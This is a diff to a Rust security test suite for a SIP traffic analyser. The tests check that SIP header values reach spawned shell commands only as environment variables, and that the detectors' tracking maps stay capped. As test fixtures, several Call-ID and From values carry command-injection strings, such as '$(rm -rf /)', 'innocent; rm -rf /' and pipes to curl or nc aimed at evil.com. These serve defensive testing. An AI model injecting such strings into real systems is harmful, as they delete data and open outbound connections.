@@ -17,14 +17,16 @@ use sipnab::output::prometheus::{PrometheusMetrics, format_metrics};
 use sipnab::security::alerting::{AlertEngine, AlertRule, sanitize_log_value};
 use sipnab::security::{FraudDetector, RegFloodDetector, ScannerDetector};
 
+type TestError = Box<dyn std::error::Error>;
+
 // ── Helpers ─────────────────────────────────────────────────────────
 
 /// Loopback IPv4 address used as the default packet endpoint.
 /// A fixed capture time. The alert engine measures cooldowns and windows
 /// in packet time, so a test that wants "an immediate repeat" passes the
 /// same stamp twice rather than racing a wall clock.
-fn at_t() -> chrono::DateTime<chrono::Utc> {
-    chrono::DateTime::from_timestamp(1_700_000_000, 0).expect("valid timestamp")
+fn at_t() -> Result<chrono::DateTime<chrono::Utc>, TestError> {
+    Ok(chrono::DateTime::from_timestamp(1_700_000_000, 0).ok_or("valid timestamp")?)
 }
 
 fn localhost() -> IpAddr {
@@ -32,8 +34,12 @@ fn localhost() -> IpAddr {
 }
 
 /// Fixed deterministic timestamp (2024-06-15 14:00:00 UTC) for parses.
-fn ts() -> DateTime<Utc> {
-    chrono::TimeZone::with_ymd_and_hms(&Utc, 2024, 6, 15, 14, 0, 0).unwrap()
+fn ts() -> Result<DateTime<Utc>, TestError> {
+    Ok(
+        chrono::TimeZone::with_ymd_and_hms(&Utc, 2024, 6, 15, 14, 0, 0)
+            .single()
+            .ok_or("valid timestamp")?,
+    )
 }
 
 /// Assembles a raw SIP message from a first line, header lines, and a body,
@@ -77,15 +83,15 @@ fn wait_until<T>(deadline: std::time::Duration, mut cond: impl FnMut() -> Option
 }
 
 /// Wait for a spawned event-exec child to write non-empty file content.
-fn wait_for_file(path: &str) -> String {
-    wait_until(
+fn wait_for_file(path: &str) -> Result<String, TestError> {
+    Ok(wait_until(
         std::time::Duration::from_secs(10),
         || match std::fs::read_to_string(path) {
             Ok(s) if !s.is_empty() => Some(s),
             _ => None,
         },
     )
-    .expect("event-exec child should write the file within 10s")
+    .ok_or("event-exec child should write the file within 10s")?)
 }
 
 /// A minimal [`tracing::Subscriber`] that records each event's level and
@@ -118,9 +124,11 @@ impl tracing::Subscriber for WarnCapture {
         }
         let mut visitor = MsgVisitor(String::new());
         event.record(&mut visitor);
+        // A poisoned lock still holds every event recorded before the
+        // panic that poisoned it; keep recording rather than lose them.
         self.events
             .lock()
-            .expect("capture mutex")
+            .unwrap_or_else(std::sync::PoisonError::into_inner)
             .push((*event.metadata().level(), visitor.0));
     }
     fn enter(&self, _span: &tracing::span::Id) {}
@@ -134,7 +142,7 @@ impl tracing::Subscriber for WarnCapture {
 /// to a temp file and checking that the literal malicious string is there
 /// (it was passed as data, not executed).
 #[test]
-fn exec_template_no_command_injection_via_call_id() {
+fn exec_template_no_command_injection_via_call_id() -> Result<(), TestError> {
     let malicious_call_id = "$(id)@evil.com";
 
     let raw = build_sip(
@@ -150,14 +158,13 @@ fn exec_template_no_command_injection_via_call_id() {
     );
     let msg = sipnab::sip::parse_sip(
         &raw,
-        ts(),
+        ts()?,
         localhost(),
         localhost(),
         5060,
         5060,
         TransportProto::Udp,
-    )
-    .expect("should parse");
+    )?;
 
     // The SIP message holds the malicious value as-is
     assert_eq!(msg.call_id(), Some(malicious_call_id));
@@ -165,8 +172,12 @@ fn exec_template_no_command_injection_via_call_id() {
     // Spawn a command that writes SIPNAB_CALL_ID env var to a temp file.
     // If the value were interpolated into the shell command, $(id) would
     // execute. By passing via env var, the literal string is preserved.
-    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
-    let tmp_path = tmp.path().to_str().unwrap().to_string();
+    let tmp = tempfile::NamedTempFile::new()?;
+    let tmp_path = tmp
+        .path()
+        .to_str()
+        .ok_or("tmp.path() is not UTF-8")?
+        .to_string();
     let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");
 
     let mut engine = EventExecEngine::new(
@@ -176,20 +187,21 @@ fn exec_template_no_command_injection_via_call_id() {
         3.0,
         sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
     );
-    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
+    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).ok_or("dialog")?;
     engine.fire_dialog_event(&dialog);
 
-    let contents = wait_for_file(&tmp_path);
+    let contents = wait_for_file(&tmp_path)?;
     assert_eq!(
         contents, malicious_call_id,
         "env var should contain the literal malicious string, not its shell expansion"
     );
+    Ok(())
 }
 
 /// C1/C2: From header with shell command substitution must not be
 /// interpolated into the command string.
 #[test]
-fn exec_template_no_injection_via_from_header() {
+fn exec_template_no_injection_via_from_header() -> Result<(), TestError> {
     let raw = build_sip(
         "INVITE sip:bob@example.com SIP/2.0",
         &[
@@ -203,25 +215,28 @@ fn exec_template_no_injection_via_from_header() {
     );
     let msg = sipnab::sip::parse_sip(
         &raw,
-        ts(),
+        ts()?,
         localhost(),
         localhost(),
         5060,
         5060,
         TransportProto::Udp,
-    )
-    .expect("should parse");
+    )?;
 
     // The From header retains the malicious value
-    let from = msg.from_header().unwrap();
+    let from = msg.from_header().ok_or("msg.from_header() returned None")?;
     assert!(
         from.contains("$(rm -rf /)"),
         "From header should preserve original value"
     );
 
     // Spawn a command that writes SIPNAB_FROM to a temp file
-    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
-    let tmp_path = tmp.path().to_str().unwrap().to_string();
+    let tmp = tempfile::NamedTempFile::new()?;
+    let tmp_path = tmp
+        .path()
+        .to_str()
+        .ok_or("tmp.path() is not UTF-8")?
+        .to_string();
     let cmd = format!("printf '%s' \"$SIPNAB_FROM\" > {tmp_path}");
 
     let mut engine = EventExecEngine::new(
@@ -231,22 +246,23 @@ fn exec_template_no_injection_via_from_header() {
         3.0,
         sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
     );
-    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
+    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).ok_or("dialog")?;
     engine.fire_dialog_event(&dialog);
 
     // SIPNAB_FROM contains the user part extracted from the From URI, not
     // the full header. The key point: the shell did not execute $(rm -rf /).
     // If it had, the file would be missing or contain different content.
-    let contents = wait_for_file(&tmp_path);
+    let contents = wait_for_file(&tmp_path)?;
     assert!(
         !contents.is_empty(),
         "command should have written env var content"
     );
+    Ok(())
 }
 
 /// C1/C2: Backtick-based command injection in Call-ID must not execute.
 #[test]
-fn exec_template_no_injection_via_backticks() {
+fn exec_template_no_injection_via_backticks() -> Result<(), TestError> {
     let raw = build_sip(
         "INVITE sip:bob@example.com SIP/2.0",
         &[
@@ -260,17 +276,20 @@ fn exec_template_no_injection_via_backticks() {
     );
     let msg = sipnab::sip::parse_sip(
         &raw,
-        ts(),
+        ts()?,
         localhost(),
         localhost(),
         5060,
         5060,
         TransportProto::Udp,
-    )
-    .expect("should parse");
+    )?;
 
-    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
-    let tmp_path = tmp.path().to_str().unwrap().to_string();
+    let tmp = tempfile::NamedTempFile::new()?;
+    let tmp_path = tmp
+        .path()
+        .to_str()
+        .ok_or("tmp.path() is not UTF-8")?
+        .to_string();
     let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");
 
     let mut engine = EventExecEngine::new(
@@ -280,19 +299,20 @@ fn exec_template_no_injection_via_backticks() {
         3.0,
         sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
     );
-    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
+    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).ok_or("dialog")?;
     engine.fire_dialog_event(&dialog);
 
-    let contents = wait_for_file(&tmp_path);
+    let contents = wait_for_file(&tmp_path)?;
     assert_eq!(
         contents, "`whoami`@evil.com",
         "backticks must be preserved literally, not executed"
     );
+    Ok(())
 }
 
 /// C1/C2: Semicolon in Call-ID must not allow command chaining.
 #[test]
-fn exec_template_no_injection_via_semicolon() {
+fn exec_template_no_injection_via_semicolon() -> Result<(), TestError> {
     let raw = build_sip(
         "INVITE sip:bob@example.com SIP/2.0",
         &[
@@ -306,17 +326,20 @@ fn exec_template_no_injection_via_semicolon() {
     );
     let msg = sipnab::sip::parse_sip(
         &raw,
-        ts(),
+        ts()?,
         localhost(),
         localhost(),
         5060,
         5060,
         TransportProto::Udp,
-    )
-    .expect("should parse");
+    )?;
 
-    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
-    let tmp_path = tmp.path().to_str().unwrap().to_string();
+    let tmp = tempfile::NamedTempFile::new()?;
+    let tmp_path = tmp
+        .path()
+        .to_str()
+        .ok_or("tmp.path() is not UTF-8")?
+        .to_string();
     let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");
 
     let mut engine = EventExecEngine::new(
@@ -326,19 +349,20 @@ fn exec_template_no_injection_via_semicolon() {
         3.0,
         sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
     );
-    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
+    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).ok_or("dialog")?;
     engine.fire_dialog_event(&dialog);
 
-    let contents = wait_for_file(&tmp_path);
+    let contents = wait_for_file(&tmp_path)?;
     assert_eq!(
         contents, "innocent; rm -rf /",
         "semicolons must be preserved literally, not interpreted by shell"
     );
+    Ok(())
 }
 
 /// C1/C2: Pipe character in Call-ID must not allow command piping.
 #[test]
-fn exec_template_no_injection_via_pipe() {
+fn exec_template_no_injection_via_pipe() -> Result<(), TestError> {
     let raw = build_sip(
         "INVITE sip:bob@example.com SIP/2.0",
         &[
@@ -352,17 +376,20 @@ fn exec_template_no_injection_via_pipe() {
     );
     let msg = sipnab::sip::parse_sip(
         &raw,
-        ts(),
+        ts()?,
         localhost(),
         localhost(),
         5060,
         5060,
         TransportProto::Udp,
-    )
-    .expect("should parse");
+    )?;
 
-    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
-    let tmp_path = tmp.path().to_str().unwrap().to_string();
+    let tmp = tempfile::NamedTempFile::new()?;
+    let tmp_path = tmp
+        .path()
+        .to_str()
+        .ok_or("tmp.path() is not UTF-8")?
+        .to_string();
     let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");
 
     let mut engine = EventExecEngine::new(
@@ -372,14 +399,15 @@ fn exec_template_no_injection_via_pipe() {
         3.0,
         sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
     );
-    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
+    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).ok_or("dialog")?;
     engine.fire_dialog_event(&dialog);
 
-    let contents = wait_for_file(&tmp_path);
+    let contents = wait_for_file(&tmp_path)?;
     assert_eq!(
         contents, "innocent | curl evil.com",
         "pipe characters must be preserved literally, not interpreted by shell"
     );
+    Ok(())
 }
 
 /// C1/C2: Alert exec detail with shell metacharacters must be passed as an
@@ -389,36 +417,41 @@ fn exec_template_no_injection_via_pipe() {
 /// interpolated into the command string, `$(id)` / backticks / `rm -rf /`
 /// would have executed and the file contents would differ.
 #[test]
-fn alert_exec_no_injection_via_detail() {
+fn alert_exec_no_injection_via_detail() -> Result<(), TestError> {
     // The exec command echoes $SIPNAB_DETAIL (the only channel for the detail)
     // into a temp file.
-    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
-    let tmp_path = tmp.path().to_str().unwrap().to_string();
+    let tmp = tempfile::NamedTempFile::new()?;
+    let tmp_path = tmp
+        .path()
+        .to_str()
+        .ok_or("tmp.path() is not UTF-8")?
+        .to_string();
     let cmd = format!("printf '%s' \"$SIPNAB_DETAIL\" > {tmp_path}");
 
-    let mut engine = AlertEngine::new(vec![AlertRule::parse("test:1/1s").unwrap()], Some(cmd));
+    let mut engine = AlertEngine::new(vec![AlertRule::parse("test:1/1s")?], Some(cmd));
 
     // Shell metacharacters that would execute if the detail were spliced into
     // the command string. No CR/LF, so log-sanitization leaves it byte-exact.
     let malicious = "$(id); rm -rf / `whoami` | nc evil.com 9";
-    let fired = engine.fire("test", localhost(), malicious, at_t());
+    let fired = engine.fire("test", localhost(), malicious, at_t()?);
     assert!(
         fired,
         "alert should fire (fresh (src, type), not in cooldown)"
     );
 
-    let contents = wait_for_file(&tmp_path);
+    let contents = wait_for_file(&tmp_path)?;
     assert_eq!(
         contents, malicious,
         "SIPNAB_DETAIL must hold the literal payload, not its shell expansion"
     );
+    Ok(())
 }
 
 /// C1/C2: Legacy %variable placeholders are migrated to $SIPNAB_* env
 /// var references at construction time. We verify by spawning a command
 /// with legacy syntax and checking that the env vars are set.
 #[test]
-fn template_migration_converts_percent_to_env_vars() {
+fn template_migration_converts_percent_to_env_vars() -> Result<(), TestError> {
     let raw = build_sip(
         "INVITE sip:bob@example.com SIP/2.0",
         &[
@@ -432,18 +465,21 @@ fn template_migration_converts_percent_to_env_vars() {
     );
     let msg = sipnab::sip::parse_sip(
         &raw,
-        ts(),
+        ts()?,
         localhost(),
         localhost(),
         5060,
         5060,
         TransportProto::Udp,
-    )
-    .expect("should parse");
+    )?;
 
     // Use legacy %call_id syntax -- it should be migrated to $SIPNAB_CALL_ID
-    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
-    let tmp_path = tmp.path().to_str().unwrap().to_string();
+    let tmp = tempfile::NamedTempFile::new()?;
+    let tmp_path = tmp
+        .path()
+        .to_str()
+        .ok_or("tmp.path() is not UTF-8")?
+        .to_string();
     let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");
 
     // Pass the template with legacy %call_id -- the engine migrates it
@@ -455,14 +491,15 @@ fn template_migration_converts_percent_to_env_vars() {
         3.0,
         sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
     );
-    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
+    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).ok_or("dialog")?;
     engine.fire_dialog_event(&dialog);
 
-    let contents = wait_for_file(&tmp_path);
+    let contents = wait_for_file(&tmp_path)?;
     assert_eq!(
         contents, "migration-test@example.com",
         "%call_id should have been migrated to $SIPNAB_CALL_ID and resolved via env var"
     );
+    Ok(())
 }
 
 // =====================================================================
@@ -475,7 +512,7 @@ fn template_migration_converts_percent_to_env_vars() {
 /// The limit caps compile-time and memory cost, not ReDoS: the `regex` crate
 /// is linear-time and does not backtrack.
 #[test]
-fn scanner_detect_rejects_oversized_regex() {
+fn scanner_detect_rejects_oversized_regex() -> Result<(), TestError> {
     // Build a regex pattern that exceeds the 1MB size limit.
     // Nested quantifiers like (a+)+ are exponential after compilation.
     let huge_pattern = "a".repeat(500_000);
@@ -498,25 +535,25 @@ fn scanner_detect_rejects_oversized_regex() {
     );
     let msg = sipnab::sip::parse_sip(
         &raw,
-        ts(),
+        ts()?,
         IpAddr::V4(Ipv4Addr::new(10, 0, 0, 99)),
         localhost(),
         5060,
         5060,
         TransportProto::Udp,
-    )
-    .expect("parse");
+    )?;
 
     let mut det = detector;
     assert!(
         det.check(&msg).is_some(),
         "built-in patterns should still work after oversized pattern is rejected"
     );
+    Ok(())
 }
 
 /// H1: Invalid regex patterns must not panic -- they are silently skipped.
 #[test]
-fn scanner_detect_handles_invalid_regex_gracefully() {
+fn scanner_detect_handles_invalid_regex_gracefully() -> Result<(), TestError> {
     // Unclosed group, invalid regex syntax
     let invalid_patterns = vec![
         "(?P<unclosed".to_string(),
@@ -525,6 +562,7 @@ fn scanner_detect_handles_invalid_regex_gracefully() {
     ];
     // Should not panic during construction
     let _detector = ScannerDetector::new(&invalid_patterns);
+    Ok(())
 }
 
 // =====================================================================
@@ -536,7 +574,7 @@ fn scanner_detect_handles_invalid_regex_gracefully() {
 /// proxy headers entirely.
 #[cfg(feature = "api")]
 #[test]
-fn api_ignores_x_forwarded_for_header() {
+fn api_ignores_x_forwarded_for_header() -> Result<(), TestError> {
     use sipnab::output::api::RateLimiter;
 
     // The RateLimiter uses IpAddr directly (from ConnectInfo, not headers).
@@ -561,6 +599,7 @@ fn api_ignores_x_forwarded_for_header() {
         limiter.check(other_ip),
         "different IP should be independent"
     );
+    Ok(())
 }
 
 // =====================================================================
@@ -602,12 +641,23 @@ fn victim_ip() -> IpAddr {
 ///
 /// `403` rather than `401`: an auth challenge is what every registration
 /// begins with, so it carries no reconnaissance signal and is not counted.
-fn refused_probe(n: u32, src: IpAddr) -> (sipnab::sip::SipMessage, sipnab::sip::SipMessage) {
+fn refused_probe(
+    n: u32,
+    src: IpAddr,
+) -> Result<(sipnab::sip::SipMessage, sipnab::sip::SipMessage), TestError> {
     let via = format!("Via: SIP/2.0/UDP scanner.example.com;branch=z9hG4bK-cap-{n}");
     let call_id = format!("Call-ID: cap-{n}@test");
     let cseq = format!("CSeq: {n} OPTIONS");
-    let parse = |raw: &[u8], from: IpAddr, to: IpAddr| {
-        sipnab::sip::parse_sip(raw, ts(), from, to, 5060, 5060, TransportProto::Udp).expect("parse")
+    let parse = |raw: &[u8], from: IpAddr, to: IpAddr| -> Result<_, TestError> {
+        Ok(sipnab::sip::parse_sip(
+            raw,
+            ts()?,
+            from,
+            to,
+            5060,
+            5060,
+            TransportProto::Udp,
+        )?)
     };
     let probe = parse(
         &build_sip(
@@ -624,7 +674,7 @@ fn refused_probe(n: u32, src: IpAddr) -> (sipnab::sip::SipMessage, sipnab::sip::
         ),
         src,
         localhost(),
-    );
+    )?;
     // A response travels back the way the request came, so its DESTINATION is
     // the source whose probe it settles.
     let refusal = parse(
@@ -642,8 +692,8 @@ fn refused_probe(n: u32, src: IpAddr) -> (sipnab::sip::SipMessage, sipnab::sip::
         ),
         localhost(),
         src,
-    );
-    (probe, refusal)
+    )?;
+    Ok((probe, refusal))
 }
 
 /// The H4 caps are enforced by evicting the *oldest* entry once the map is
@@ -665,42 +715,43 @@ fn refused_probe(n: u32, src: IpAddr) -> (sipnab::sip::SipMessage, sipnab::sip::
 /// capture shows the source being refused — see [`refused_probe`].
 #[test]
 #[serial_test::serial]
-fn scanner_detector_caps_behavioral_entries() {
+fn scanner_detector_caps_behavioral_entries() -> Result<(), TestError> {
     // Each call is one probe transaction and the refusal that answers it. The
     // alert under test belongs to the probe; the refusal never alerts.
     let mut seq = 0u32;
-    let mut probe = |detector: &mut ScannerDetector, ip: IpAddr| {
+    let mut probe = |detector: &mut ScannerDetector, ip: IpAddr| -> Result<_, TestError> {
         seq += 1;
-        let (probe, refusal) = refused_probe(seq, ip);
+        let (probe, refusal) = refused_probe(seq, ip)?;
         let alert = detector.check(&probe);
         let _ = detector.check(&refusal);
-        alert
+        Ok(alert)
     };
 
     // Control: the 11th probe from a single source alerts (10 do not).
     let mut control = ScannerDetector::new(&[]);
     for _ in 0..10 {
-        assert!(probe(&mut control, victim_ip()).is_none());
+        assert!(probe(&mut control, victim_ip())?.is_none());
     }
     assert!(
-        probe(&mut control, victim_ip()).is_some(),
+        probe(&mut control, victim_ip())?.is_some(),
         "control: an 11th probe must alert, else the eviction check is vacuous"
     );
 
     // Seed the victim to 10 probes (one below the alert threshold), oldest.
     let mut detector = ScannerDetector::new(&[]);
     for _ in 0..10 {
-        assert!(probe(&mut detector, victim_ip()).is_none());
+        assert!(probe(&mut detector, victim_ip())?.is_none());
     }
     // Fill the map with fresh IPs, evicting the oldest entry (the victim).
     for ip in 1..=H4_CAP + 1 {
-        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)));
+        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)))?;
     }
     // The victim's next probe must start fresh — proof its state was evicted.
     assert!(
-        probe(&mut detector, victim_ip()).is_none(),
+        probe(&mut detector, victim_ip())?.is_none(),
         "cap regressed: victim state survived the flood and re-alerted"
     );
+    Ok(())
 }
 
 /// H4: Fraud detector call patterns must be capped. Uses the wangiri path: a
@@ -714,7 +765,7 @@ fn scanner_detector_caps_behavioral_entries() {
 /// that used to make every call in a capture look like a short one.
 #[test]
 #[serial_test::serial]
-fn fraud_detector_caps_call_pattern_entries() {
+fn fraud_detector_caps_call_pattern_entries() -> Result<(), TestError> {
     let headers = [
         "From: <sip:attacker@example.com>;tag=f1",
         "To: <sip:5551234@example.com>;tag=t1",
@@ -722,63 +773,63 @@ fn fraud_detector_caps_call_pattern_entries() {
         "CSeq: 1 INVITE",
         "Content-Length: 0",
     ];
-    let parse = |raw: &[u8]| {
-        sipnab::sip::parse_sip(
+    let parse = |raw: &[u8]| -> Result<_, TestError> {
+        Ok(sipnab::sip::parse_sip(
             raw,
-            ts(),
+            ts()?,
             localhost(),
             localhost(),
             5060,
             5060,
             TransportProto::Udp,
-        )
-        .expect("parse")
+        )?)
     };
     let invite = parse(&build_sip(
         "INVITE sip:5551234@example.com SIP/2.0",
         &headers,
         b"",
-    ));
+    ))?;
     let bye = parse(&build_sip(
         "BYE sip:5551234@example.com SIP/2.0",
         &headers,
         b"",
-    ));
+    ))?;
 
     let mut seq = 0usize;
-    let mut probe = |detector: &mut FraudDetector, ip: IpAddr| {
+    let mut probe = |detector: &mut FraudDetector, ip: IpAddr| -> Result<_, TestError> {
         seq += 1;
-        let mut dialog = sipnab::sip::dialog::SipDialog::new(&invite).expect("dialog");
+        let mut dialog = sipnab::sip::dialog::SipDialog::new(&invite).ok_or("dialog")?;
         dialog.src_addr = ip;
         dialog.call_id = format!("fraud-cap-{seq}@test");
         // The BYE ends the dialog; the span is then the call's duration.
         sipnab::sip::dialog::update_state(&mut dialog, &bye);
         dialog.updated_at = dialog.created_at + chrono::TimeDelta::seconds(1);
-        detector.check(&bye, &dialog)
+        Ok(detector.check(&bye, &dialog))
     };
 
     // Control: the 3rd short call to the same prefix alerts (2 do not).
     let mut control = FraudDetector::new(None);
     for _ in 0..2 {
-        assert!(probe(&mut control, victim_ip()).is_none());
+        assert!(probe(&mut control, victim_ip())?.is_none());
     }
     assert!(
-        probe(&mut control, victim_ip()).is_some(),
+        probe(&mut control, victim_ip())?.is_some(),
         "control: a 3rd short call must alert, else the eviction check is vacuous"
     );
 
     // Seed the victim to 2 short calls (one below threshold), oldest.
     let mut detector = FraudDetector::new(None);
     for _ in 0..2 {
-        assert!(probe(&mut detector, victim_ip()).is_none());
+        assert!(probe(&mut detector, victim_ip())?.is_none());
     }
     for ip in 1..=H4_CAP + 1 {
-        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)));
+        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)))?;
     }
     assert!(
-        probe(&mut detector, victim_ip()).is_none(),
+        probe(&mut detector, victim_ip())?.is_none(),
         "cap regressed: victim call-pattern survived the flood and re-alerted"
     );
+    Ok(())
 }
 
 /// One credentialed REGISTER from `src` on transaction `n`, and the 401 that
@@ -788,8 +839,11 @@ fn fraud_detector_caps_call_pattern_entries() {
 /// Each pair is stamped one microsecond after the last, so "the oldest
 /// entry" is a fact about the capture rather than about HashMap iteration
 /// order, and ten thousand of them still sit inside one one-second window.
-fn refused_registration(n: u32, src: IpAddr) -> (sipnab::sip::SipMessage, sipnab::sip::SipMessage) {
-    let at = ts() + chrono::TimeDelta::microseconds(i64::from(n));
+fn refused_registration(
+    n: u32,
+    src: IpAddr,
+) -> Result<(sipnab::sip::SipMessage, sipnab::sip::SipMessage), TestError> {
+    let at = ts()? + chrono::TimeDelta::microseconds(i64::from(n));
     let via = format!("Via: SIP/2.0/UDP 10.9.0.1:5060;branch=z9hG4bK-reg-{n}");
     let call_id = format!("Call-ID: reg-{n}@test");
     let register = build_sip(
@@ -818,13 +872,21 @@ fn refused_registration(n: u32, src: IpAddr) -> (sipnab::sip::SipMessage, sipnab
         ],
         b"",
     );
-    let parse = |raw: &[u8], s: IpAddr, d: IpAddr| {
-        sipnab::sip::parse_sip(raw, at, s, d, 5060, 5060, TransportProto::Udp).expect("parse")
+    let parse = |raw: &[u8], s: IpAddr, d: IpAddr| -> Result<_, TestError> {
+        Ok(sipnab::sip::parse_sip(
+            raw,
+            at,
+            s,
+            d,
+            5060,
+            5060,
+            TransportProto::Udp,
+        )?)
     };
-    (
-        parse(&register, src, localhost()),
-        parse(&refusal, localhost(), src),
-    )
+    Ok((
+        parse(&register, src, localhost())?,
+        parse(&refusal, localhost(), src)?,
+    ))
 }
 
 /// One challenged failure for `ip`: the REGISTER, which must never alert on
@@ -833,15 +895,15 @@ fn challenged_failure(
     detector: &mut RegFloodDetector,
     seq: &mut u32,
     ip: IpAddr,
-) -> Option<sipnab::security::RegFloodAlert> {
+) -> Result<Option<sipnab::security::RegFloodAlert>, TestError> {
     *seq += 1;
-    let (register, refusal) = refused_registration(*seq, ip);
+    let (register, refusal) = refused_registration(*seq, ip)?;
     assert!(
         detector.check(&register).is_none(),
         "a REGISTER raised the alert on its own: a request is a volume, and only the \
          registrar's answer to it is an outcome"
     );
-    detector.check(&refusal)
+    Ok(detector.check(&refusal))
 }
 
 /// H4: Registration flood detector source tracking must be capped. The alert
@@ -849,31 +911,32 @@ fn challenged_failure(
 /// refused -- exceed the threshold within the 1s window.
 #[test]
 #[serial_test::serial]
-fn reg_flood_detector_caps_source_entries() {
+fn reg_flood_detector_caps_source_entries() -> Result<(), TestError> {
     let mut seq = 0u32;
 
     // Control: with threshold 5, the 6th challenged failure alerts (5 do not).
     let mut control = RegFloodDetector::new(5);
     for _ in 0..5 {
-        assert!(challenged_failure(&mut control, &mut seq, victim_ip()).is_none());
+        assert!(challenged_failure(&mut control, &mut seq, victim_ip())?.is_none());
     }
     assert!(
-        challenged_failure(&mut control, &mut seq, victim_ip()).is_some(),
+        challenged_failure(&mut control, &mut seq, victim_ip())?.is_some(),
         "control: a 6th challenged failure must alert, else the eviction check is vacuous"
     );
 
     // Seed the victim to 5 failures (one below threshold), oldest.
     let mut detector = RegFloodDetector::new(5);
     for _ in 0..5 {
-        assert!(challenged_failure(&mut detector, &mut seq, victim_ip()).is_none());
+        assert!(challenged_failure(&mut detector, &mut seq, victim_ip())?.is_none());
     }
     for ip in 1..=H4_CAP + 1 {
-        let _ = challenged_failure(&mut detector, &mut seq, IpAddr::V4(Ipv4Addr::from(ip)));
+        let _ = challenged_failure(&mut detector, &mut seq, IpAddr::V4(Ipv4Addr::from(ip)))?;
     }
     assert!(
-        challenged_failure(&mut detector, &mut seq, victim_ip()).is_none(),
+        challenged_failure(&mut detector, &mut seq, victim_ip())?.is_none(),
         "cap regressed: victim source state survived the flood and re-alerted"
     );
+    Ok(())
 }
 
 /// A flood of responses must not be able to evict a tracked source.
@@ -886,29 +949,30 @@ fn reg_flood_detector_caps_source_entries() {
 /// evicted its state in the middle of the brute force it was counting.
 #[test]
 #[serial_test::serial]
-fn reg_flood_response_flood_cannot_evict_a_tracked_source() {
+fn reg_flood_response_flood_cannot_evict_a_tracked_source() -> Result<(), TestError> {
     let mut seq = 0u32;
     let mut detector = RegFloodDetector::new(5);
     for _ in 0..5 {
-        assert!(challenged_failure(&mut detector, &mut seq, victim_ip()).is_none());
+        assert!(challenged_failure(&mut detector, &mut seq, victim_ip())?.is_none());
     }
     // A 401 toward every address in a range, none of them answering a
     // REGISTER this detector saw.
     for ip in 1..=H4_CAP + 1 {
         seq += 1;
-        let (_, refusal) = refused_registration(seq, IpAddr::V4(Ipv4Addr::from(ip)));
+        let (_, refusal) = refused_registration(seq, IpAddr::V4(Ipv4Addr::from(ip)))?;
         assert!(detector.check(&refusal).is_none());
     }
     // One more source registers. If the responses created entries, the map
     // is at its cap and this evicts the oldest -- the victim.
     seq += 1;
-    let (newcomer, _) = refused_registration(seq, IpAddr::V4(Ipv4Addr::new(10, 200, 0, 1)));
+    let (newcomer, _) = refused_registration(seq, IpAddr::V4(Ipv4Addr::new(10, 200, 0, 1)))?;
     let _ = detector.check(&newcomer);
     assert!(
-        challenged_failure(&mut detector, &mut seq, victim_ip()).is_some(),
+        challenged_failure(&mut detector, &mut seq, victim_ip())?.is_some(),
         "the victim's five failures were lost: a flood of responses to addresses that \
          never registered filled the map and evicted the one source that did"
     );
+    Ok(())
 }
 
 /// H4: Alert engine cooldown tracking must be capped. A fired (src, rule) pair
@@ -916,39 +980,44 @@ fn reg_flood_response_flood_cannot_evict_a_tracked_source() {
 /// engine still remember this pair?" directly observable via `fire`'s return.
 #[test]
 #[serial_test::serial]
-fn alert_engine_caps_cooldown_entries() {
+fn alert_engine_caps_cooldown_entries() -> Result<(), TestError> {
     // Hour-long cooldown so a remembered pair stays suppressed for the whole
     // test; the map key is (src_ip, rule).
-    let new_engine =
-        || AlertEngine::new(vec![AlertRule::parse("test:1/1s:1h").expect("parse")], None);
+    let new_engine = || -> Result<AlertEngine, TestError> {
+        Ok(AlertEngine::new(
+            vec![AlertRule::parse("test:1/1s:1h")?],
+            None,
+        ))
+    };
 
     // Control: a repeat fire of the same pair is suppressed (cooldown works).
-    let mut control = new_engine();
+    let mut control = new_engine()?;
     assert!(
-        control.fire("test", victim_ip(), "d", at_t()),
+        control.fire("test", victim_ip(), "d", at_t()?),
         "first fire must fire"
     );
     assert!(
-        !control.fire("test", victim_ip(), "d", at_t()),
+        !control.fire("test", victim_ip(), "d", at_t()?),
         "control: an immediate repeat must be suppressed, else the check is vacuous"
     );
 
     // Seed the victim's cooldown entry (oldest), then flood fresh source IPs to
     // fill the map and evict the oldest (the victim).
-    let mut engine = new_engine();
+    let mut engine = new_engine()?;
     assert!(
-        engine.fire("test", victim_ip(), "d", at_t()),
+        engine.fire("test", victim_ip(), "d", at_t()?),
         "first fire must fire"
     );
     for ip in 1..=H4_CAP + 1 {
-        engine.fire("test", IpAddr::V4(Ipv4Addr::from(ip)), "d", at_t());
+        engine.fire("test", IpAddr::V4(Ipv4Addr::from(ip)), "d", at_t()?);
     }
     // A working cap evicted the victim, so it fires again; a regressed cap
